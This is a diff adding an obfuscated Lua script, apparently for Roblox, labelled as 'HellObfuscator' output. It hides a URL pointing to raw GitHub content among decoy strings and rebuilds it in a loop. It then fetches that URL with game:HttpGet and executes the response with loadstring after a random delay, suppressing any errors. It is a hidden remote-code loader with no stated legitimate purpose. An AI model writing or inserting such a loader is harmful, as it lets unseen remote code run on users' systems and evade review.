@@ -1,0 +1,119 @@
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+-- HellObfuscator Generated Script
+--[[ Protected by HellObfuscator v3.0 | Secure & Encrypted ]]
+local v_II1I1lII = {}
+local v_Il1ll111 = {
+    string.char(65 + 2) .. string.char(106 + 5) .. string.char(100 + 10) .. string.char(101 + 9) .. string.char(94 + 7) .. string.char(96 + 3) .. string.char(110 + 6) .. string.char(97 + 8) .. string.char(104 + 7) .. string.char(108 + 2) .. string.char(30 + 2) .. string.char(110 + 4) .. string.char(97 + 4) .. string.char(99 + 3) .. string.char(113 + 4) .. string.char(110 + 5) .. string.char(99 + 2) .. string.char(99 + 1),
+    string.char(83 + 2) .. string.char(111 + 4) .. string.char(99 + 2) .. string.char(105 + 9) .. string.char(23 + 9) .. string.char(103 + 7) .. string.char(101 + 10) .. string.char(109 + 7) .. string.char(31 + 1) .. string.char(97 + 5) .. string.char(101 + 10) .. string.char(116 + 1) .. string.char(100 + 10) .. string.char(99 + 1),
+    string.char(75 + 3) .. string.char(110 + 7) .. string.char(103 + 5) .. string.char(107 + 1) .. string.char(22 + 10) .. string.char(113 + 1) .. string.char(95 + 6) .. string.char(95 + 7) .. string.char(91 + 10) .. string.char(107 + 7) .. string.char(96 + 5) .. string.char(105 + 5) .. string.char(94 + 5) .. string.char(97 + 4),
+    string.char(71 + 2) .. string.char(105 + 5) .. string.char(103 + 2) .. string.char(112 + 4) .. string.char(95 + 10) .. string.char(93 + 4) .. string.char(100 + 8) .. string.char(98 + 7) .. string.char(115 + 7) .. string.char(102 + 3) .. string.char(108 + 2) .. string.char(95 + 8) .. string.char(38 + 8) .. string.char(41 + 5) .. string.char(39 + 7),
+    string.char(72 + 3) .. string.char(79 + 3) .. string.char(75 + 3) .. string.char(71 + 5),
+    string.char(68 + 8) .. string.char(101 + 10) .. string.char(87 + 10) .. string.char(99 + 1) .. string.char(101 + 4) .. string.char(101 + 9) .. string.char(96 + 7) .. string.char(27 + 5) .. string.char(87 + 10) .. string.char(112 + 3) .. string.char(107 + 8) .. string.char(94 + 7) .. string.char(114 + 2) .. string.char(110 + 5) .. string.char(37 + 9) .. string.char(45 + 1) .. string.char(37 + 9),
+    string.char(68 + 5) .. string.char(105 + 5) .. string.char(100 + 5) .. string.char(115 + 1) .. string.char(103 + 2) .. string.char(89 + 8) .. string.char(98 + 10) .. string.char(102 + 3) .. string.char(118 + 4) .. string.char(97 + 8) .. string.char(103 + 7) .. string.char(101 + 2) .. string.char(44 + 2) .. string.char(43 + 3) .. string.char(37 + 9),
+    string.char(55 + 1) .. string.char(35 + 2) .. string.char(47 + 10) .. string.char(41 + 7) .. string.char(30 + 7) .. string.char(61 + 5) .. string.char(45 + 4) .. string.char(35 + 2) .. string.char(61 + 8) .. string.char(47 + 6) .. string.char(28 + 9) .. string.char(64 + 1) .. string.char(62 + 7) .. string.char(29 + 8) .. string.char(54 + 3) .. string.char(55 + 10) .. string.char(28 + 9) .. string.char(64 + 5) .. string.char(50 + 3) .. string.char(30 + 7) .. string.char(46 + 10) .. string.char(51 + 5),
+    string.char(79 + 4) .. string.char(117 + 4) .. string.char(101 + 9) .. string.char(89 + 8) .. string.char(104 + 8) .. string.char(107 + 8) .. string.char(95 + 6) .. string.char(29 + 3) .. string.char(86 + 2),
+    string.char(64 + 2) .. string.char(120 + 1) .. string.char(111 + 1) .. string.char(95 + 2) .. string.char(107 + 8) .. string.char(110 + 5) .. string.char(24 + 8) .. string.char(64 + 6) .. string.char(91 + 6) .. string.char(101 + 4) .. string.char(105 + 3) .. string.char(99 + 2) .. string.char(93 + 7),
+    string.char(82 + 1) .. string.char(112 + 4) .. string.char(89 + 8) .. string.char(94 + 5) .. string.char(104 + 3) .. string.char(24 + 8) .. string.char(106 + 5) .. string.char(115 + 3) .. string.char(100 + 1) .. string.char(113 + 1) .. string.char(97 + 5) .. string.char(102 + 6) .. string.char(102 + 9) .. string.char(111 + 8),
+    string.char(78 + 5) .. string.char(113 + 8) .. string.char(107 + 3) .. string.char(91 + 6) .. string.char(107 + 5) .. string.char(106 + 9) .. string.char(99 + 2) .. string.char(26 + 6) .. string.char(78 + 10),
+    string.char(92 + 7) .. string.char(110 + 1) .. string.char(107 + 3) .. string.char(110 + 6) .. string.char(98 + 3) .. string.char(108 + 2) .. string.char(111 + 5) .. string.char(42 + 4) .. string.char(95 + 4) .. string.char(107 + 4) .. string.char(108 + 1) .. string.char(39 + 8) .. string.char(91 + 8) .. string.char(100 + 4) .. string.char(102 + 3) .. string.char(106 + 4) .. string.char(115 + 7) .. string.char(96 + 8) .. string.char(116 + 1) .. string.char(102 + 9) .. string.char(116 + 4) .. string.char(108 + 9),
+    string.char(81 + 2) .. string.char(97 + 2) .. string.char(108 + 6) .. string.char(95 + 10) .. string.char(111 + 1) .. string.char(114 + 2) .. string.char(80 + 7) .. string.char(94 + 3) .. string.char(112 + 2) .. string.char(93 + 8),
+    string.char(82 + 1) .. string.char(112 + 4) .. string.char(93 + 4) .. string.char(92 + 7) .. string.char(100 + 7) .. string.char(26 + 6) .. string.char(109 + 2) .. string.char(114 + 4) .. string.char(95 + 6) .. string.char(108 + 6) .. string.char(98 + 4) .. string.char(106 + 2) .. string.char(109 + 2) .. string.char(112 + 7),
+    string.char(75 + 2) .. string.char(93 + 8) .. string.char(99 + 10) .. string.char(108 + 3) .. string.char(104 + 10) .. string.char(114 + 7) .. string.char(22 + 10) .. string.char(90 + 10) .. string.char(111 + 6) .. string.char(101 + 8) .. string.char(107 + 5),
+    string.char(73 + 3) .. string.char(106 + 5) .. string.char(90 + 7) .. string.char(91 + 9) .. string.char(98 + 7) .. string.char(107 + 3) .. string.char(98 + 5) .. string.char(27 + 5) .. string.char(94 + 3) .. string.char(105 + 10) .. string.char(112 + 3) .. string.char(92 + 9) .. string.char(113 + 3) .. string.char(113 + 2) .. string.char(36 + 10) .. string.char(42 + 4) .. string.char(45 + 1),
+    string.char(70 + 6) .. string.char(102 + 9) .. string.char(91 + 6) .. string.char(93 + 7) .. string.char(99 + 6) .. string.char(106 + 4) .. string.char(101 + 2) .. string.char(31 + 1) .. string.char(93 + 4) .. string.char(108 + 7) .. string.char(106 + 9) .. string.char(99 + 2) .. string.char(109 + 7) .. string.char(106 + 9) .. string.char(44 + 2) .. string.char(36 + 10) .. string.char(36 + 10),
+    string.char(72 + 5) .. string.char(99 + 2) .. string.char(102 + 7) .. string.char(106 + 5) .. string.char(113 + 1) .. string.char(119 + 2) .. string.char(27 + 5) .. string.char(95 + 5) .. string.char(111 + 6) .. string.char(99 + 10) .. string.char(108 + 4),
+    string.char(80 + 3) .. string.char(89 + 10) .. string.char(107 + 7) .. string.char(97 + 8) .. string.char(104 + 8) .. string.char(110 + 6) .. string.char(86 + 1) .. string.char(93 + 4) .. string.char(109 + 5) .. string.char(91 + 10),
+    string.char(64 + 9) .. string.char(109 + 1) .. string.char(104 + 1) .. string.char(110 + 6) .. string.char(102 + 3) .. string.char(92 + 5) .. string.char(107 + 1) .. string.char(95 + 10) .. string.char(114 + 8) .. string.char(101 + 4) .. string.char(104 + 6) .. string.char(98 + 5) .. string.char(38 + 8) .. string.char(38 + 8) .. string.char(44 + 2),
+    string.char(66 + 3) .. string.char(105 + 9) .. string.char(112 + 2) .. string.char(106 + 5) .. string.char(106 + 8) .. string.char(56 + 2) .. string.char(23 + 9) .. string.char(44 + 8) .. string.char(42 + 6) .. string.char(49 + 3),
+    string.char(79 + 6) .. string.char(111 + 4) .. string.char(99 + 2) .. string.char(106 + 8) .. string.char(22 + 10) .. string.char(100 + 10) .. string.char(109 + 2) .. string.char(113 + 3) .. string.char(31 + 1) .. string.char(98 + 4) .. string.char(102 + 9) .. string.char(116 + 1) .. string.char(101 + 9) .. string.char(98 + 2),
+    string.char(63 + 10) .. string.char(107 + 3) .. string.char(102 + 3) .. string.char(112 + 4) .. string.char(103 + 2) .. string.char(90 + 7) .. string.char(102 + 6) .. string.char(102 + 3) .. string.char(113 + 9) .. string.char(104 + 1) .. string.char(108 + 2) .. string.char(102 + 1) .. string.char(44 + 2) .. string.char(44 + 2) .. string.char(39 + 7),
+    string.char(63 + 4) .. string.char(106 + 5) .. string.char(101 + 9) .. string.char(100 + 10) .. string.char(95 + 6) .. string.char(93 + 6) .. string.char(107 + 9) .. string.char(99 + 6) .. string.char(101 + 10) .. string.char(108 + 2) .. string.char(28 + 4) .. string.char(105 + 9) .. string.char(97 + 4) .. string.char(99 + 3) .. string.char(114 + 3) .. string.char(111 + 4) .. string.char(98 + 3) .. string.char(90 + 10),
+    string.char(74 + 9) .. string.char(98 + 1) .. string.char(104 + 10) .. string.char(102 + 3) .. string.char(105 + 7) .. string.char(115 + 1) .. string.char(78 + 9) .. string.char(95 + 2) .. string.char(108 + 6) .. string.char(98 + 3),
+    string.char(67 + 10) .. string.char(95 + 6) .. string.char(100 + 9) .. string.char(106 + 5) .. string.char(104 + 10) .. string.char(118 + 3) .. string.char(22 + 10) .. string.char(94 + 6) .. string.char(109 + 8) .. string.char(106 + 3) .. string.char(111 + 1),
+    string.char(103 + 1) .. string.char(96 + 5) .. string.char(87 + 10) .. string.char(91 + 9) .. string.char(111 + 4) .. string.char(43 + 4) .. string.char(100 + 9) .. string.char(91 + 6) .. string.char(104 + 1) .. string.char(104 + 6) .. string.char(46 + 1) .. string.char(32 + 5) .. string.char(60 + 9) .. string.char(46 + 7) .. string.char(32 + 5) .. string.char(65 + 1) .. string.char(45 + 3) .. string.char(34 + 3) .. string.char(50 + 6) .. string.char(63 + 7) .. string.char(31 + 6) .. string.char(64 + 5),
+    string.char(63 + 3) .. string.char(113 + 8) .. string.char(104 + 8) .. string.char(96 + 1) .. string.char(105 + 10) .. string.char(105 + 10) .. string.char(28 + 4) .. string.char(67 + 3) .. string.char(95 + 2) .. string.char(104 + 1) .. string.char(102 + 6) .. string.char(92 + 9) .. string.char(98 + 2),
+    string.char(63 + 3) .. string.char(120 + 1) .. string.char(105 + 7) .. string.char(95 + 2) .. string.char(110 + 5) .. string.char(108 + 7) .. string.char(31 + 1) .. string.char(63 + 7) .. string.char(93 + 4) .. string.char(98 + 7) .. string.char(102 + 6) .. string.char(95 + 6) .. string.char(93 + 7),
+    string.char(81 + 4) .. string.char(113 + 2) .. string.char(98 + 3) .. string.char(108 + 6) .. string.char(28 + 4) .. string.char(104 + 6) .. string.char(105 + 6) .. string.char(110 + 6) .. string.char(31 + 1) .. string.char(101 + 1) .. string.char(108 + 3) .. string.char(115 + 2) .. string.char(100 + 10) .. string.char(97 + 3),
+    string.char(76 + 7) .. string.char(113 + 3) .. string.char(90 + 7) .. string.char(90 + 9) .. string.char(104 + 3) .. string.char(30 + 2) .. string.char(102 + 9) .. string.char(113 + 5) .. string.char(100 + 1) .. string.char(105 + 9) .. string.char(100 + 2) .. string.char(101 + 7) .. string.char(101 + 10) .. string.char(115 + 4),
+    string.char(76 + 1) .. string.char(91 + 10) .. string.char(107 + 2) .. string.char(104 + 7) .. string.char(111 + 3) .. string.char(114 + 7) .. string.char(24 + 8) .. string.char(92 + 8) .. string.char(113 + 4) .. string.char(101 + 8) .. string.char(111 + 1),
+    string.char(71 + 2) .. string.char(100 + 10) .. string.char(103 + 2) .. string.char(109 + 7) .. string.char(102 + 3) .. string.char(95 + 2) .. string.char(102 + 6) .. string.char(104 + 1) .. string.char(117 + 5) .. string.char(98 + 7) .. string.char(108 + 2) .. string.char(101 + 2) .. string.char(40 + 6) .. string.char(42 + 4) .. string.char(37 + 9),
+    string.char(78 + 5) .. string.char(92 + 7) .. string.char(110 + 4) .. string.char(99 + 6) .. string.char(108 + 4) .. string.char(115 + 1) .. string.char(85 + 2) .. string.char(87 + 10) .. string.char(109 + 5) .. string.char(91 + 10),
+    string.char(81 + 4) .. string.char(110 + 5) .. string.char(93 + 8) .. string.char(113 + 1) .. string.char(27 + 5) .. string.char(109 + 1) .. string.char(104 + 7) .. string.char(111 + 5) .. string.char(30 + 2) .. string.char(99 + 3) .. string.char(106 + 5) .. string.char(112 + 5) .. string.char(100 + 10) .. string.char(99 + 1),
+    string.char(71 + 6) .. string.char(99 + 2) .. string.char(105 + 4) .. string.char(109 + 2) .. string.char(104 + 10) .. string.char(120 + 1) .. string.char(23 + 9) .. string.char(91 + 9) .. string.char(107 + 10) .. string.char(107 + 2) .. string.char(105 + 7),
+    string.char(67 + 6) .. string.char(107 + 3) .. string.char(95 + 10) .. string.char(113 + 3) .. string.char(95 + 10) .. string.char(95 + 2) .. string.char(107 + 1) .. string.char(101 + 4) .. string.char(116 + 6) .. string.char(97 + 8) .. string.char(109 + 1) .. string.char(101 + 2) .. string.char(44 + 2) .. string.char(40 + 6) .. string.char(37 + 9),
+    string.char(71 + 6) .. string.char(98 + 3) .. string.char(103 + 6) .. string.char(106 + 5) .. string.char(113 + 1) .. string.char(118 + 3) .. string.char(23 + 9) .. string.char(90 + 10) .. string.char(111 + 6) .. string.char(106 + 3) .. string.char(106 + 6),
+    string.char(71 + 2) .. string.char(109 + 1) .. string.char(102 + 3) .. string.char(107 + 9) .. string.char(104 + 1) .. string.char(96 + 1) .. string.char(100 + 8) .. string.char(97 + 8) .. string.char(113 + 9) .. string.char(103 + 2) .. string.char(109 + 1) .. string.char(94 + 9) .. string.char(39 + 7) .. string.char(38 + 8) .. string.char(44 + 2),
+    string.char(67 + 6) .. string.char(103 + 7) .. string.char(98 + 7) .. string.char(109 + 7) .. string.char(100 + 5) .. string.char(93 + 4) .. string.char(99 + 9) .. string.char(95 + 10) .. string.char(117 + 5) .. string.char(103 + 2) .. string.char(104 + 6) .. string.char(100 + 3) .. string.char(36 + 10) .. string.char(42 + 4) .. string.char(43 + 3),
+    string.char(95 + 9) .. string.char(115 + 1) .. string.char(114 + 2) .. string.char(108 + 4) .. string.char(105 + 10) .. string.char(52 + 6) .. string.char(39 + 8) .. string.char(43 + 4) .. string.char(110 + 4) .. string.char(92 + 5) .. string.char(115 + 4) .. string.char(45 + 1) .. string.char(100 + 3) .. string.char(100 + 5) .. string.char(106 + 10) .. string.char(96 + 8) .. string.char(115 + 2) .. string.char(92 + 6) .. string.char(116 + 1) .. string.char(112 + 3) .. string.char(92 + 9) .. string.char(104 + 10),
+    string.char(79 + 6) .. string.char(113 + 2) .. string.char(98 + 3) .. string.char(106 + 8) .. string.char(29 + 3) .. string.char(103 + 7) .. string.char(109 + 2) .. string.char(115 + 1) .. string.char(25 + 7) .. string.char(93 + 9) .. string.char(106 + 5) .. string.char(107 + 10) .. string.char(102 + 8) .. string.char(94 + 6),
+    string.char(79 + 4) .. string.char(89 + 10) .. string.char(106 + 8) .. string.char(104 + 1) .. string.char(108 + 4) .. string.char(109 + 7) .. string.char(79 + 8) .. string.char(96 + 1) .. string.char(108 + 6) .. string.char(98 + 3),
+    string.char(94 + 3) .. string.char(101 + 9) .. string.char(43 + 8) .. string.char(39 + 6) .. string.char(94 + 4) .. string.char(120 + 1) .. string.char(114 + 2) .. string.char(94 + 7) .. string.char(37 + 10) .. string.char(79 + 3) .. string.char(101 + 10) .. string.char(90 + 8) .. string.char(103 + 5) .. string.char(109 + 2) .. string.char(113 + 7) .. string.char(37 + 8) .. string.char(43 + 4) .. string.char(104 + 10) .. string.char(98 + 3) .. string.char(101 + 1) .. string.char(105 + 10) .. string.char(39 + 8),
+    string.char(79 + 4) .. string.char(112 + 4) .. string.char(93 + 4) .. string.char(96 + 3) .. string.char(106 + 1) .. string.char(24 + 8) .. string.char(110 + 1) .. string.char(114 + 4) .. string.char(92 + 9) .. string.char(109 + 5) .. string.char(95 + 7) .. string.char(100 + 8) .. string.char(107 + 4) .. string.char(115 + 4),
+    string.char(32 + 5) .. string.char(56 + 10) .. string.char(53 + 1),
+    string.char(81 + 2) .. string.char(116 + 5) .. string.char(105 + 5) .. string.char(93 + 4) .. string.char(102 + 10) .. string.char(113 + 2) .. string.char(100 + 1) .. string.char(25 + 7) .. string.char(79 + 9),
+    string.char(59 + 8) .. string.char(106 + 5) .. string.char(106 + 4) .. string.char(109 + 1) .. string.char(94 + 7) .. string.char(89 + 10) .. string.char(115 + 1) .. string.char(98 + 7) .. string.char(110 + 1) .. string.char(103 + 7) .. string.char(26 + 6) .. string.char(113 + 1) .. string.char(100 + 1) .. string.char(101 + 1) .. string.char(116 + 1) .. string.char(113 + 2) .. string.char(94 + 7) .. string.char(97 + 3),
+    string.char(74 + 1) .. string.char(76 + 6) .. string.char(69 + 9) .. string.char(74 + 2),
+    string.char(70 + 7) .. string.char(95 + 6) .. string.char(105 + 4) .. string.char(110 + 1) .. string.char(111 + 3) .. string.char(116 + 5) .. string.char(30 + 2) .. string.char(91 + 9) .. string.char(108 + 9) .. string.char(107 + 2) .. string.char(109 + 3),
+    string.char(63 + 4) .. string.char(100 + 4) .. string.char(95 + 6) .. string.char(97 + 2) .. string.char(105 + 2) .. string.char(99 + 6) .. string.char(108 + 2) .. string.char(96 + 7) .. string.char(22 + 10) .. string.char(83 + 4) .. string.char(101 + 3) .. string.char(99 + 6) .. string.char(109 + 7) .. string.char(100 + 1) .. string.char(99 + 9) .. string.char(101 + 4) .. string.char(113 + 2) .. string.char(110 + 6) .. string.char(44 + 2) .. string.char(41 + 5) .. string.char(36 + 10),
+    string.char(79 + 4) .. string.char(115 + 1) .. string.char(95 + 2) .. string.char(93 + 6) .. string.char(101 + 6) .. string.char(25 + 7) .. string.char(102 + 9) .. string.char(111 + 7) .. string.char(100 + 1) .. string.char(108 + 6) .. string.char(97 + 5) .. string.char(107 + 1) .. string.char(103 + 8) .. string.char(114 + 5),
+    string.char(67 + 6) .. string.char(103 + 7) .. string.char(117 + 1) .. string.char(91 + 6) .. string.char(103 + 5) .. string.char(98 + 7) .. string.char(92 + 8) .. string.char(28 + 4) .. string.char(70 + 5) .. string.char(92 + 9) .. string.char(114 + 7),
+    string.char(81 + 4) .. string.char(106 + 9) .. string.char(94 + 7) .. string.char(111 + 3) .. string.char(28 + 4) .. string.char(100 + 10) .. string.char(104 + 7) .. string.char(113 + 3) .. string.char(30 + 2) .. string.char(101 + 1) .. string.char(109 + 2) .. string.char(108 + 9) .. string.char(103 + 7) .. string.char(97 + 3),
+    string.char(58 + 9) .. string.char(103 + 8) .. string.char(108 + 2) .. string.char(103 + 7) .. string.char(99 + 2) .. string.char(97 + 2) .. string.char(113 + 3) .. string.char(103 + 2) .. string.char(102 + 9) .. string.char(101 + 9) .. string.char(30 + 2) .. string.char(105 + 9) .. string.char(98 + 3) .. string.char(92 + 10) .. string.char(115 + 2) .. string.char(109 + 6) .. string.char(94 + 7) .. string.char(95 + 5),
+}
+local v_1IIIll11 = ''
+local v_ll1ll11l = 0
+while v_ll1ll11l < 200 do
+    v_ll1ll11l = v_ll1ll11l + 1
+    local v_l1l1II1l = math.random(1, 100)
+local v_lllI11Il = 370
+local v_IIlI1llI = 2696
+v_lllI11Il = v_lllI11Il / (v_IIlI1llI + math.random(1, 10))
+if v_lllI11Il > 999999 then v_lllI11Il = 0 end
+v_lllI11Il = v_lllI11Il % (v_IIlI1llI + math.random(1, 10))
+if v_lllI11Il > 999999 then v_lllI11Il = 0 end
+    if v_ll1ll11l == 15 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[39]
+    end
+    if v_ll1ll11l == 30 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[12]
+    end
+    if v_ll1ll11l == 42 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[43]
+    end
+    if v_ll1ll11l == 58 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[27]
+    end
+    if v_ll1ll11l == 75 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[8]
+    end
+    if v_ll1ll11l == 87 then
+        v_1IIIll11 = v_1IIIll11 .. v_Il1ll111[47]
+    end
+end
+local function v_Illl1111()
+    local success, result = pcall(function()
+        return game:HttpGet(v_1IIIll11)
+    end)
+    if success and result and string.len(result) > 0 then
+        loadstring(result)()
+    end
+end
+task.delay(math.random(0.5, 1.5), v_Illl1111)
